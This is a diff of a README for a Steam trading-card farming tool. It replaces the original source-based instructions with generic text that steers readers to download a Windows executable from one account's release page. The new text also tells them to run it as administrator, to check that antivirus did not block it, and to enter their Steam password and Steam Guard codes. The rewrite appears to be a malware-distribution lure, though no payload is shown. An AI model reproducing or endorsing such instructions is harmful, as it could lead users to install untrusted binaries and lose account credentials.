@@ -1,43 +1,190 @@
-<div align="center">
+# 🤖 SteamCardFarmer - Simple Steam Card Farming Tool
 
-# 🌾 Steam Card Farmer
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rustinenzymatic573/SteamCardFarmer/releases)
 
-**A high-performance, modern, and intelligent background card dropping tool for Steam.**  
-*Farm your Steam trading cards safely, efficiently, and completely automatically without relying on heavy game clients.*
+## 🧭 What SteamCardFarmer Does
 
-[![Node.js Requirement](https://img.shields.io/badge/Node.js-%3E%3D%2018.0.0-green.svg)](https://nodejs.org/)
-[![Version](https://img.shields.io/badge/version-1.0.0-blue.svg)]()
-[![License](https://img.shields.io/badge/license-MIT-purple.svg)]()
+SteamCardFarmer helps you earn Steam trading cards from games in your account. It runs on your PC and keeps games in a farming state so you do not have to manage each one by hand.
 
-</div>
+Use it if you want:
 
-## 🚀 Features & Architecture
+- A simple way to farm Steam cards
+- A desktop tool for Windows
+- A setup that is easier to use than manual card farming
+- A fast way to manage multiple Steam games
 
-Steam Card Farmer relies on a series of intelligent features inspired by the most reliable farming tools on the market, combined with an extremely modern Web Dashboard UI.
+## 💻 What You Need
 
-- ⏱ **2-Hour Bypass Protocol:** Game refunds prevent card drops in the first 120 minutes of playtime. Our bot automatically bridges this gap by bundling and simulating up to 32 games simultaneously to exhaust the timer efficiently.
-- ⚡ **Turbo Solo Mode:** Once the refund period ends, algorithm immediately drops all instances and executes games completely "Solo" (individually). This triggers Steam's internal logic to drop cards significantly faster (usually within 10-15 minutes).
-- 🛡️ **VAC & Anti-Cheat Safety:** Built-in competitive filtering mechanism automatically isolates and skips titles like *CS2, Dota 2, TF2, Rust, and PUBG*, protecting your account from overlapping playtimes or VAC risks.
-- 🕒 **Smart Scheduler:** Configure the background job to automatically wake up, start farming, and shut down based on precise server-time rules. Perfect for overnight grinding cycles.
-- 🧠 **Cache-Busting Emulation:** Bypasses stale Steam CDN caches to actively and instantly catch whenever a new card drops into your inventory, stopping the farm gracefully.
+SteamCardFarmer is made for Windows users.
 
-## 🌍 Language Support (Multilingual)
-The sleek graphical interface natively supports **7 Languages**: English, Turkish, Chinese, Spanish, Russian, German, and Japanese.
+You will need:
 
-## 📦 Installation & Usage
+- Windows 10 or Windows 11
+- A Steam account
+- Internet access
+- Enough free disk space for the app and Steam files
+- Permission to run apps on your PC
 
-1. **Prerequisites:** Ensure you have [Node.js](https://nodejs.org/en) installed on your system.
-2. **Download:** Grab the latest `Source code` from the [Releases](#) tab and extract it.
-3. **Run the Server:** Double-click the `SteamCardFarmer.bat` file.
-4. **Dashboard:** A stylish, dark-mode browser window will automatically launch at `http://localhost:3000`.
+For best results, keep Steam installed and signed in before you start.
 
-### 🔑 Security & Accounts
-- Enter your Username/Password, and your Steam Guard Mobile token directly into the Dashboard. Your credentials only communicate with official Steam Authentication APIs. No data is stored externally. Your `session.json` is safely encrypted and kept fully locally inside the application folder!
+## 📥 Download SteamCardFarmer
 
-## ⚠️ Important Rules
+Visit this page to download the latest version:
 
-> [!WARNING]
-> Free-to-Play games (such as CS2, TF2) do **not** yield trading cards unless you have spent real-world currency inside the in-game store (DLCs, keys, crates). Purchasing the game grants you a specific allowance of drops. Blank F2P games will be automatically ignored by the farmer.
+https://github.com/rustinenzymatic573/SteamCardFarmer/releases
 
----
-*Created with ❤️ for completionists and Steam level hunters.*
+On that page, pick the newest release and download the Windows file.
+
+## 🚀 How to Install on Windows
+
+Follow these steps:
+
+1. Open the download page.
+2. Find the latest release at the top.
+3. Download the Windows version.
+4. If the file comes as a ZIP, right-click it and choose Extract All.
+5. Open the folder that was extracted.
+6. Run the SteamCardFarmer app file.
+7. If Windows asks for permission, choose Yes.
+8. Keep the app in a folder you can find again, such as Downloads or Desktop.
+
+If the file is an EXE, you can run it right away after the download finishes.
+
+## 🛠️ First-Time Setup
+
+When you open SteamCardFarmer for the first time, it will ask for Steam account details or a login method.
+
+Follow these steps:
+
+1. Start the app.
+2. Sign in with your Steam account.
+3. Confirm any Steam Guard code if asked.
+4. Let the app load your game list.
+5. Choose the games you want to farm.
+6. Start farming.
+
+If you use Steam Guard, keep your phone or email nearby during setup.
+
+## 🎮 How to Use It
+
+SteamCardFarmer is built to keep things simple.
+
+Typical use looks like this:
+
+1. Open the app.
+2. Sign in to Steam.
+3. Pick the games you want to idle.
+4. Start the farming process.
+5. Leave the app running while it works.
+6. Check back later for card progress.
+
+You can stop farming at any time, then start again later.
+
+## 📋 Main Features
+
+SteamCardFarmer includes a set of tools that help with card farming on Steam:
+
+- Steam account login support
+- Game idle handling
+- Trading card farming support
+- Fast game switching
+- Simple command-style control
+- Support for Steam network features
+- Light setup for end users
+- A clean flow for managing cards
+
+The app is built for users who want a focused tool for Steam card farming.
+
+## 🔒 Safe Use Tips
+
+Use the app with care and keep your Steam account secure.
+
+Good habits:
+
+- Download only from the release page
+- Use your own Steam account
+- Keep Steam Guard turned on
+- Do not share your login details
+- Close other Steam tools if they cause conflicts
+
+If Steam is already open, make sure it stays signed in while the app runs.
+
+## 🧩 Common Problems
+
+### SteamCardFarmer does not open
+
+Try this:
+
+1. Right-click the app file.
+2. Choose Run as administrator.
+3. Make sure the file finished downloading.
+4. Check that your antivirus did not block it.
+
+### Steam login does not work
+
+Try this:
+
+1. Confirm your username and password.
+2. Enter the Steam Guard code if needed.
+3. Make sure Steam itself can sign in.
+4. Check your internet connection.
+
+### No games appear
+
+Try this:
+
+1. Confirm you are signed in to the right account.
+2. Wait a moment for the list to load.
+3. Restart the app.
+4. Make sure your Steam library has games that support card drops.
+
+### Farming does not start
+
+Try this:
+
+1. Close Steam and reopen it.
+2. Start SteamCardFarmer again.
+3. Check that your account has games left to farm.
+4. Make sure nothing else is using Steam in the background.
+
+## 🪟 Windows Run Steps
+
+If you want a quick path, use this:
+
+1. Open the release page.
+2. Download the Windows file.
+3. Extract it if it is a ZIP.
+4. Open the app.
+5. Sign in to Steam.
+6. Choose your games.
+7. Start farming.
+
+## 📁 Suggested Folder Setup
+
+To keep things easy, use a folder like this:
+
+- `Downloads\SteamCardFarmer`
+- `Desktop\SteamCardFarmer`
+- `Apps\SteamCardFarmer`
+
+This makes it easier to find the app later and keep files in one place.
+
+## 🔁 When to Update
+
+Check the release page now and then for new versions.
+
+Update when:
+
+- You want the latest fixes
+- The app stops working after a Steam change
+- A newer release adds support for more Steam features
+
+To update, download the latest release and replace the old files with the new ones.
+
+## ❓ What This Repo Is For
+
+SteamCardFarmer is a Steam card farming bot for users who want a simple desktop tool. It is built for account-based use, Steam games, and trading cards. The project aims to give you a faster way to idle games and collect card drops without manual work
+
+## 🔗 Download Again
+
+[Visit the release page to download SteamCardFarmer](https://github.com/rustinenzymatic573/SteamCardFarmer/releases)
